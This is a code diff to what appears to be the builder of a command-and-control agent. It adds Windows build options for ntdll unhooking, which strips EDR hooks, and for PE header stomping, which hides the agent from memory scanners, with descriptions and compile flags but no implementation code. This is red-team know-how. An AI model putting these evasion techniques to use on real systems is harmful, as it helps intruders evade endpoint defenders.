@@ -87,6 +87,28 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             default_value=False,
             required=False,
         ),
+        BuildParameter(
+            name="unhook_ntdll",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "ntdll unhooking (Windows only): at startup, remap the .text section of "
+                "ntdll.dll from a clean on-disk copy over the in-memory version. Removes "
+                "EDR userland hook stubs from NT syscall wrappers before the first beacon."
+            ),
+            default_value=False,
+            required=False,
+        ),
+        BuildParameter(
+            name="pe_stamp",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "PE header stomping (Windows only): zero the MZ/PE headers of the agent "
+                "process in memory after startup. Memory scanners looking for PE signatures "
+                "to identify unbacked or suspicious regions find nothing."
+            ),
+            default_value=False,
+            required=False,
+        ),
     ]
     agent_path = Path("agent_functions")
     agent_icon_path = agent_path / "aphrodite.svg"
@@ -260,7 +282,9 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             debug = self.get_parameter("debug") or False
             obfuscation = self.get_parameter("obfuscation") or "none"
             output_format = self.get_parameter("output_format") or "exe"
-            sleep_obf = self.get_parameter("sleep_obf") or False
+            sleep_obf    = self.get_parameter("sleep_obf") or False
+            unhook_ntdll = self.get_parameter("unhook_ntdll") or False
+            pe_stamp     = self.get_parameter("pe_stamp") or False
 
             if output_format == "shellcode" and target_os != "windows":
                 build_stderr += "ERROR: shellcode output format is only supported for Windows targets.\n"
@@ -389,6 +413,14 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                 if sleep_obf and target_os == "windows":
                     nim_flags.append("-d:sleepObf")
                     build_stdout += "[*] Sleep obfuscation enabled (AES key + callback ID XOR'd during sleep)\n"
+
+                if unhook_ntdll and target_os == "windows":
+                    nim_flags.append("-d:unhookNtdll")
+                    build_stdout += "[*] ntdll unhooking enabled (remap clean .text from disk at startup)\n"
+
+                if pe_stamp and target_os == "windows":
+                    nim_flags.append("-d:peStamp")
+                    build_stdout += "[*] PE header stomping enabled (zero MZ/PE headers in memory after startup)\n"
 
                 # --- OS-specific compilation flags ---
                 if target_os == "windows":
